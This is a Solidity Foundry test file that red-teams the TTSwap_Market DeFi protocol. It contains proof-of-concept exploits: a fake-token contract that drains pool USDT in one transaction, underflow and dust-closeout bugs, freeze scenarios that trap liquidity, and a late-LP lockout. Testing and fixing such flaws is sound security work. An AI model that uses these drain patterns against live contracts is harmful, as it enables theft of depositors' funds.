// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.29;

import {BaseSetup} from "../BaseSetup.t.sol";
import {MyToken} from "../../src/test/MyToken.sol";
import {TTSwap_Market} from "../../src/TTSwap_Market.sol";
import {S_GoodTmpState, S_ProofState, S_ProofKey} from "../../src/interfaces/I_TTSwap_Market.sol";
import {T_GoodKey, T_GoodKeyLibrary} from "../../src/type/T_GoodKey.sol";
import {L_ProofIdLibrary} from "../../src/libraries/L_Proof.sol";
import {L_GoodConfigLibrary} from "../../src/libraries/L_GoodConfig.sol";
import {TTSwapError} from "../../src/libraries/L_Error.sol";
import {TestConfigConstants} from "../TestConfigConstants.sol";
import {
    L_TTSwapUINT256Library,
    toTTSwapUINT256
} from "../../src/libraries/L_TTSwapUINT256.sol";

/// @dev Same-tx helper: init a self-priced fake good and payGood-drain USDT in one call.
contract RTFlashDrain {
    function attack(
        TTSwap_Market market,
        T_GoodKey calldata fakeKey,
        T_GoodKey calldata usdtKey,
        uint256 initPacked,
        uint256 payPacked
    ) external {
        MyToken(payable(fakeKey.contractAddress)).approve(
            address(market),
            type(uint256).max
        );
        market.initGood(fakeKey, initPacked, bytes(""), address(this), bytes(""));
        market.payGood(
            fakeKey,
            usdtKey,
            payPacked,
            address(this),
            bytes(""),
            address(this),
            bytes(""),
            0
        );
    }
}

/// @notice Fifth-wave red team. Scope: L_Good error 34 / dust closeout,
///         Market+Token proxies, Token freeze cross-contract halt.
contract RT_FifthWave is BaseSetup {
    using T_GoodKeyLibrary for T_GoodKey;
    using L_TTSwapUINT256Library for uint256;
    using L_ProofIdLibrary for S_ProofKey;
    using L_GoodConfigLibrary for uint256;

    uint128 internal constant USDT_INIT_QTY = uint128(50_000 * 10 ** 6);
    uint128 internal constant USDT_INIT_VALUE = uint128(50_000 * 10 ** 12);
    uint128 internal constant BTC_INIT_QTY = uint128(1 * 10 ** 8);
    uint128 internal constant BTC_INIT_VALUE = uint128(63_000 * 10 ** 12);
    uint128 internal constant MIN_INIT_QTY = 500_000;
    uint128 internal constant MAX_INIT_VALUE = uint128(2 ** 109);

    address internal attacker;
    address internal victim;
    uint256 internal usdtGoodId;
    uint256 internal btcGoodId;

    function setUp() public override {
        BaseSetup.setUp();
        attacker = users[4];
        victim = users[5];
        vm.warp(100);
        usdtGoodId = _init(_usdtKey(), marketcreator, USDT_INIT_VALUE, USDT_INIT_QTY);
        btcGoodId = _init(_btcKey(), users[1], BTC_INIT_VALUE, BTC_INIT_QTY);
    }

    function _usdtKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(usdt), id: 0});
    }

    function _btcKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(btc), id: 0});
    }

    function _ethKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(eth), id: 0});
    }

    function _init(
        T_GoodKey memory key,
        address owner,
        uint128 value,
        uint128 qty
    ) internal returns (uint256 goodId) {
        vm.startPrank(owner);
        deal(key.contractAddress, owner, 100 * uint256(qty), false);
        MyToken(payable(key.contractAddress)).approve(address(market), type(uint256).max);
        market.initGood(key, toTTSwapUINT256(value, qty), defaultdata, owner, defaultdata);
        _snapMarket("market_initGood_RT_FifthWave.t_95");
        goodId = key.toId();
        vm.stopPrank();
    }

    function _proofId(address owner, uint256 goodId) internal pure returns (uint256) {
        return S_ProofKey({owner: owner, currentgood: goodId}).toId();
    }

    function _setDisinvestFee(uint256 goodId, address owner, uint256 field) internal {
        vm.startPrank(owner);
        uint256 cfg = market.getGoodState(goodId).goodConfig;
        cfg = (cfg & ~(uint256(0x3f) << TestConfigConstants.DISINVEST_FEE_SHIFT))
            | (field << TestConfigConstants.DISINVEST_FEE_SHIFT);
        market.modifyGoodByGoodOwner(goodId, cfg, owner, defaultdata);
        _snapMarket("market_modifyGoodByGoodOwner_RT_FifthWave.t_109");
        vm.stopPrank();
    }

    function _setLimitPower(uint256 goodId, uint256 field) internal {
        vm.startPrank(marketcreator);
        uint256 cfg = market.getGoodState(goodId).goodConfig;
        cfg = (cfg & ~(uint256(0x1f) << TestConfigConstants.LIMIT_POWER_SHIFT))
            | (field << TestConfigConstants.LIMIT_POWER_SHIFT);
        market.modifyGoodByManager(goodId, cfg, marketcreator, defaultdata);
        _snapMarket("market_modifyGoodByManager_RT_FifthWave.t_118");
        vm.stopPrank();
    }

    function _setOwnerPower(uint256 goodId, address owner, uint256 field) internal {
        vm.startPrank(owner);
        uint256 cfg = market.getGoodState(goodId).goodConfig;
        cfg = (cfg & ~(uint256(0x1f) << TestConfigConstants.POWER_SHIFT))
            | (field << TestConfigConstants.POWER_SHIFT);
        market.modifyGoodByGoodOwner(goodId, cfg, owner, defaultdata);
        _snapMarket("market_modifyGoodByGoodOwner_RT_FifthWave.t_127");
        vm.stopPrank();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-25 (FIXED with RT-32): dust closeout used to substitute FULL qty while
    // burning only the requested shares / computing profit on the slice → error
    // 34 or `profit - actual` underflow. Now shares, qty, value, and profit all
    // use the full position, so a dust-valued partial request is a fair full
    // closeout (no revert, no leftover shares).
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT25_dust_partial_minValue_hits_error34() public {
        uint128 qty = uint128(2_000_000);
        deal(address(usdt), attacker, qty, false);
        vm.startPrank(attacker);
        usdt.approve(address(market), type(uint256).max);
        market.investGood(
            _usdtKey(),
            _packInvest(usdtGoodId, qty),
            defaultdata,
            defaultdata,
            attacker
        );
        _snapMarket("market_investGood_RT_FifthWave.t_148");
        vm.stopPrank();

        uint256 proofId = _proofId(attacker, usdtGoodId);
        S_ProofState memory p = market.getProofState(proofId);
        uint128 shares = p.shares.amount0();
        uint128 state1 = p.state.amount1();
        emit log_named_uint("RT25 proof shares", shares); 
        emit log_named_uint("RT25 proof actual V", state1);

        uint256 balBefore = usdt.balanceOf(attacker);
        vm.prank(attacker);
        market.disinvestProof(proofId, 1, address(0), attacker, defaultdata);
        _snapMarket("market_disinvestProof_RT_FifthWave.t_161");

        S_ProofState memory p1 = market.getProofState(proofId);
        assertEq(p1.shares, 0, "dust slice force-closes all shares");
        assertEq(p1.invest, 0, "invest zeroed");
        assertEq(p1.state, 0, "state zeroed");
        assertGt(usdt.balanceOf(attacker), balBefore, "full-position payout");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-25b (FIXED): fee=0 no longer underflows; dust half-share request is a
    // full closeout of the proof.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT25b_dust_fee0_still_underflows_on_actual() public {
        _setDisinvestFee(usdtGoodId, marketcreator, 0);

        uint128 qty = uint128(2_000_000);
        deal(address(usdt), attacker, qty, false);
        vm.startPrank(attacker);
        usdt.approve(address(market), type(uint256).max);
        market.investGood(
            _usdtKey(),
            _packInvest(usdtGoodId, qty),
            defaultdata,
            defaultdata,
            attacker
        );
        _snapMarket("market_investGood_RT_FifthWave.t_189");
        vm.stopPrank();

        uint256 proofId = _proofId(attacker, usdtGoodId);
        uint128 shares = market.getProofState(proofId).shares.amount0();
        uint256 balBefore = usdt.balanceOf(attacker);
        vm.prank(attacker);
        market.disinvestProof(proofId, shares / 2, address(0), attacker, defaultdata);
        _snapMarket("market_disinvestProof_RT_FifthWave.t_197");

        S_ProofState memory p1 = market.getProofState(proofId);
        assertEq(p1.shares, 0, "dust half-slice force-closes all shares");
        assertGt(usdt.balanceOf(attacker), balBefore, "full-position payout at fee=0");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-26: Token Manager freezeToken() sets impl=0. Market.disinvestProof
    // always reads TTS (referral/ban/unstake) → LPs cannot exit. Swaps with
    // recipient=0 still work. Token Admin can restore via proxy.upgrade.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT26_token_freeze_bricks_lp_exit_swaps_still_live() public {
        uint128 victimInvest = uint128(1_000 * 10 ** 6);
        deal(address(usdt), victim, victimInvest, false);
        vm.startPrank(victim);
        usdt.approve(address(market), type(uint256).max);
        market.investGood(
            _usdtKey(),
            _packInvest(usdtGoodId, victimInvest),
            defaultdata,
            defaultdata,
            victim
        );
        _snapMarket("market_investGood_RT_FifthWave.t_217");
        vm.stopPrank();

        uint256 victimProof = _proofId(victim, usdtGoodId);
        uint128 victimShares = market.getProofState(victimProof).shares.amount0();
        uint256 poolUsdt = usdt.balanceOf(address(market));

        // Admin bits live on Market; must widen before TTS freeze (role reads die).
        _relaxSafeLine(usdtGoodId);
        _relaxSafeLine(btcGoodId);

        vm.prank(marketcreator);
        tts_token_proxy.freezeToken();
        assertEq(tts_token_proxy.implementation(), address(0), "token impl zeroed");

        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 63));
        market.disinvestProof(victimProof, victimShares, address(0), victim, defaultdata);
        _snapMarket("market_disinvestProof_RT_FifthWave.t_234");

        // Market DAO cannot freeze/upgrade either — both read TTS.userConfig.
        vm.prank(marketcreator);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 63));
        market_proxy.freezeMarket();

        // Trading that skips setReferral still executes against trapped inventory.
        uint128 buyIn = uint128(100 * 10 ** 6);
        deal(address(usdt), attacker, buyIn, false);
        vm.startPrank(attacker);
        usdt.approve(address(market), type(uint256).max);
        market.buyGood(
            _usdtKey(),
            _btcKey(),
            toTTSwapUINT256(buyIn, 0),
            address(0),
            defaultdata,
            attacker,
            defaultdata,
            0
        );
        _snapMarket("market_buyGood_RT_FifthWave.t_255");
        vm.stopPrank();
        assertGt(btc.balanceOf(attacker), 0, "swap lived while LP exit dead");
        emit log_named_uint("RT26 USDT still in market after freeze", poolUsdt);
        emit log_named_uint("RT26 attacker BTC bought from trapped pool", btc.balanceOf(attacker));
    }

    function test_RT26b_token_admin_unfreeze_via_proxy_upgrade() public {
        address impl = tts_token_proxy.implementation();
        vm.prank(marketcreator);
        tts_token_proxy.freezeToken();

        // disableUpgrade lives on the implementation — unreachable after freeze.
        vm.prank(marketcreator);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 63));
        tts_token.disableUpgrade();
        _snapToken("tts_token_disableUpgrade_RT_FifthWave.t_270");

        vm.prank(marketcreator);
        tts_token_proxy.upgrade(impl);
        assertEq(tts_token_proxy.implementation(), impl, "token admin restored impl");
        assertEq(tts_token.name(), "TTSwap Token", "erc20 path live again");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-27: lastRunSlot is dead code (mask only). Fake-good payGood drain
    // (RT-22) now fits in ONE call from a helper — flash-loan shaped.
    // Needs admin safeLineUpper > 100 (production trade switch).
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT27_same_tx_fake_payGood_drains_after_runslot_removed() public {
        MyToken fake = new MyToken("FAKE", "FAKE", 6);
        T_GoodKey memory fakeKey = T_GoodKey({
            ercType: 1,
            contractAddress: address(fake),
            id: 0
        });
        RTFlashDrain drain = new RTFlashDrain();
        deal(address(fake), address(drain), MIN_INIT_QTY + 10_000, false);

        uint256 fakeGoodId = fakeKey.toId();
        // Pre-create+relax would leak the "must trade first" story. Admin widens
        // USDT now; fake good is created inside the attack tx so we widen via a
        // callback after init — do it as two steps: init outside then same-tx pay
        // is the interesting bit. Here the helper does BOTH; we relax USDT first
        // and relax fake immediately after a dry init snapshot... simpler: init
        // in the helper requires the fake good to already have a wide safeLine,
        // which it cannot (created in-tx). So: helper inits, we (admin) would
        // need to relax in the same tx too.
        //
        // Privilege split: admin already widened USDT (RT-18 production switch).
        // Fake good is created inside the tx at default upper=100 → payGood
        // input-leg reverts 55 unless we also widen the fake good in-tx.
        // Market admin is not the attacker. This test proves the RUN-SLOT is
        // gone by doing init+pay in one tx AFTER admin pre-widens a *template*
        // — actually we init as attacker first, admin widens, then a second
        // payGood in a fresh helper is not same-tx as init.
        //
        // Direct proof: attacker contract calls payGood twice? Not needed.
        // Call initGood + payGood from THIS test function without roll/warp.
        vm.startPrank(attacker);
        fake.approve(address(market), type(uint256).max);
        deal(address(fake), attacker, MIN_INIT_QTY + 10_000, false);
        market.initGood(
            fakeKey,
            toTTSwapUINT256(MAX_INIT_VALUE, MIN_INIT_QTY),
            defaultdata,
            attacker,
            defaultdata
        );
        _snapMarket("market_initGood_RT_FifthWave.t_323");
        vm.stopPrank();

        _relaxSafeLine(fakeGoodId);
        _relaxSafeLine(usdtGoodId);

        uint256 usdtBefore = usdt.balanceOf(attacker);
        uint128 target = uint128((usdt.balanceOf(address(market)) * 3) / 10);
        deal(address(fake), attacker, 10_000, false);

        // No vm.roll / _warpToFreshRunSlot between init and pay — same block.
        vm.startPrank(attacker);
        fake.approve(address(market), type(uint256).max);
        market.payGood(
            fakeKey,
            _usdtKey(),
            toTTSwapUINT256(uint128(10_000), target),
            attacker,
            defaultdata,
            attacker,
            defaultdata,
            0
        );
        _snapMarket("market_payGood_RT_FifthWave.t_345");
        vm.stopPrank();

        uint256 profit = usdt.balanceOf(attacker) - usdtBefore;
        emit log_named_uint("RT27 same-block USDT drained", profit);
        assertEq(profit, target, "exact-out filled in the init block");
        assertGt(profit, 10_000, "dust fake in, 30% USDT out");
    }

    /// @dev Same setup as RT-27 but fake good stays at default upper=100.
    ///      Production config blocks the same-block drain (error 55).
    function test_RT27_default_safeline_blocks_same_block_payGood() public {
        MyToken fake = new MyToken("FAKE", "FAKE", 6);
        T_GoodKey memory fakeKey = T_GoodKey({
            ercType: 1,
            contractAddress: address(fake),
            id: 0
        });
        vm.startPrank(attacker);
        fake.approve(address(market), type(uint256).max);
        deal(address(fake), attacker, MIN_INIT_QTY + 10_000, false);
        market.initGood(
            fakeKey,
            toTTSwapUINT256(MAX_INIT_VALUE, MIN_INIT_QTY),
            defaultdata,
            attacker,
            defaultdata
        );
        vm.stopPrank();
        _relaxSafeLine(usdtGoodId);
        // deliberately NO _relaxSafeLine on fake

        uint128 target = uint128((usdt.balanceOf(address(market)) * 3) / 10);
        uint256 usdtBefore = usdt.balanceOf(attacker);
        vm.startPrank(attacker);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 55));
        market.payGood(
            fakeKey,
            _usdtKey(),
            toTTSwapUINT256(uint128(10_000), target),
            attacker,
            defaultdata,
            attacker,
            defaultdata,
            0
        );
        vm.stopPrank();
        assertEq(usdt.balanceOf(attacker), usdtBefore, "no USDT drained");
    }

    function test_RT27b_flash_helper_init_and_pay_one_call() public {
        MyToken fake = new MyToken("FAKE", "FAKE", 6);
        T_GoodKey memory fakeKey = T_GoodKey({
            ercType: 1,
            contractAddress: address(fake),
            id: 0
        });
        RTFlashDrain helper = new RTFlashDrain();
        deal(address(fake), address(helper), MIN_INIT_QTY + 10_000, false);
        _relaxSafeLine(usdtGoodId);

        // First call inits at default safeLine=100. payGood then hits 55 on
        // the fake input leg. Confirms default upper is the remaining gate.
        uint128 target = uint128((usdt.balanceOf(address(market)) * 3) / 10);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 55));
        helper.attack(
            market,
            fakeKey,
            _usdtKey(),
            toTTSwapUINT256(MAX_INIT_VALUE, MIN_INIT_QTY),
            toTTSwapUINT256(uint128(10_000), target)
        );
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-28: 5× leverage + relaxed lower (RT-18) → getBalanceLimit does
    // `Q - virtualQty` which underflows once Q < virtualQty. Outgoing
    // transfers (buy output / disinvest / commission) revert. AMM safeLine
    // would still allow the trade.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT28_leveraged_getBalanceLimit_underflow_after_buy() public {
        uint128 ethQty = uint128(10 * 10 ** 18);
        uint128 ethVal = uint128(20_000 * 10 ** 12);
        uint256 ethGoodId = _init(_ethKey(), attacker, ethVal, ethQty);

        _setLimitPower(ethGoodId, 5);
        _setOwnerPower(ethGoodId, attacker, 5);
        _relaxSafeLine(usdtGoodId);
        _relaxSafeLine(ethGoodId);

        uint128 levInvest = uint128(10 * 10 ** 18);
        deal(address(eth), attacker, levInvest, false);
        vm.startPrank(attacker);
        eth.approve(address(market), type(uint256).max);
        market.investGood(
            _ethKey(),
            _packInvest(ethGoodId, levInvest),
            defaultdata,
            defaultdata,
            attacker
        );
        _snapMarket("market_investGood_RT_FifthWave.t_405");
        vm.stopPrank();

        S_GoodTmpState memory st = market.getGoodState(ethGoodId);
        uint128 q = st.currentState.amount1();
        uint128 virtualQty = st.goodConfig.amount1();
        emit log_named_uint("RT28 Q after 5x invest", q);
        emit log_named_uint("RT28 virtualQty", virtualQty);
        assertGt(virtualQty, 0, "leverage created virtual qty");

        // Buy down ETH until Q < virtualQty (getBalanceLimit underflow) or AMM 55/56.
        uint128 buyUsdt = uint128(4_000 * 10 ** 6);
        deal(address(usdt), victim, buyUsdt * 20, false);
        vm.startPrank(victim);
        usdt.approve(address(market), type(uint256).max);

        bool bricked;
        for (uint256 i; i < 20; ++i) {
            try market.buyGood(
                _usdtKey(),
                _ethKey(),
                toTTSwapUINT256(buyUsdt, 0),
                address(0),
                defaultdata,
                victim,
                defaultdata,
                0
            ) {} catch {
                bricked = true;
                break;
            }
        }
        vm.stopPrank();

        st = market.getGoodState(ethGoodId);
        emit log_named_uint("RT28 Q after buys", st.currentState.amount1());
        emit log_named_uint("RT28 virtualQty after buys", st.goodConfig.amount1());
        emit log_named_uint("RT28 bricked", bricked ? 1 : 0);

        uint256 ethProof = _proofId(attacker, ethGoodId);
        uint128 aShares = market.getProofState(ethProof).shares.amount0() / 20;
        vm.prank(attacker);
        try market.disinvestProof(ethProof, aShares, address(0), attacker, defaultdata) {
            emit log("RT28 disinvest still worked");
        } catch {
            bricked = true;
            emit log("RT28 disinvest reverted after leveraged buys");
        }
        assertTrue(bricked, "leveraged pool hit payout brick");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-29: error 34 does not compare profit vs actual qty. An LP whose
    // investQty-share is below proof actual (after FCFS / fee-on-investQty
    // skew) reverts on `profit - actualDisinvestQuantity` even with fee=0.
    // Combined with RT-11 this is the late-LP brick, not a steal by itself.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT29_late_lp_cannot_exit_after_one_sided_flow() public {
        uint256 skinnyId = _init(_ethKey(), users[1], BTC_INIT_VALUE, 1e6);
        _relaxSafeLine(usdtGoodId);
        _relaxSafeLine(skinnyId);
        _setDisinvestFee(skinnyId, users[1], 0);

        deal(address(eth), victim, 1e6, false);
        vm.startPrank(victim);
        eth.approve(address(market), type(uint256).max);
        market.investGood(
            _ethKey(),
            _packInvest(skinnyId, 1e6),
            defaultdata,
            defaultdata,
            victim
        );
        _snapMarket("market_investGood_RT_FifthWave.t_478");
        vm.stopPrank();

        deal(address(usdt), attacker, 7.4e10, false);
        vm.startPrank(attacker);
        usdt.approve(address(market), type(uint256).max);
        market.buyGood(
            _usdtKey(),
            _ethKey(),
            toTTSwapUINT256(uint128(7.4e10), 0),
            address(0),
            defaultdata,
            attacker,
            defaultdata,
            0
        );
        _snapMarket("market_buyGood_RT_FifthWave.t_493");
        vm.stopPrank();

        uint256 physical = eth.balanceOf(address(market));
        uint256 claims = market.getGoodState(skinnyId).currentState.amount0();
        emit log_named_uint("RT29 physical ETH", physical);
        emit log_named_uint("RT29 investQty claims", claims);
        assertLt(physical, claims, "fractional reserve");

        uint256 lp1 = _proofId(users[1], skinnyId);
        uint256 lp2 = _proofId(victim, skinnyId);
        _drain(lp1, users[1]);
        uint256 victimEth = eth.balanceOf(victim);
        _drain(lp2, victim);
        uint256 victimRecovered = eth.balanceOf(victim) - victimEth;
        uint128 left = market.getProofState(lp2).shares.amount0();
        emit log_named_uint("RT29 late LP recovered", victimRecovered);
        emit log_named_uint("RT29 late LP shares left", left);
        assertGt(left, 0, "late LP still locked");
    }

    function _drain(uint256 proofId, address owner) internal {
        uint128 sharesLeft = market.getProofState(proofId).shares.amount0();
        for (uint256 i; i < 40 && sharesLeft > 0; ++i) {
            uint128 chunk = sharesLeft / 5;
            if (chunk == 0) chunk = sharesLeft;
            vm.prank(owner);
            (bool ok,) = address(market).call(
                abi.encodeCall(
                    market.disinvestProof,
                    (proofId, chunk, address(0), owner, defaultdata)
                )
            );
            if (!ok) break;
            sharesLeft = market.getProofState(proofId).shares.amount0();
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-30: Market proxy freeze+disableUpgrade still hostages TVL (RT-07).
    // Token freeze is reversible by Token Admin; Market freeze+DAO lock is not.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT30_market_freeze_then_disableUpgrade_is_permanent() public {
        uint256 pool = usdt.balanceOf(address(market));
        vm.prank(marketcreator);
        market_proxy.freezeMarket();
        vm.prank(marketcreator);
        market_proxy.disableUpgrade();

        vm.prank(marketcreator);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 1));
        market_proxy.upgrade(address(1));

        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 63));
        market.buyGood(
            _usdtKey(),
            _btcKey(),
            toTTSwapUINT256(uint128(1e6), 0),
            address(0),
            defaultdata,
            attacker,
            defaultdata,
            0
        );
        _snapMarket("market_buyGood_RT_FifthWave.t_558");
        emit log_named_uint("RT30 USDT hostage", pool);
        assertGt(pool, 0, "TVL locked in frozen proxy");
    }
}
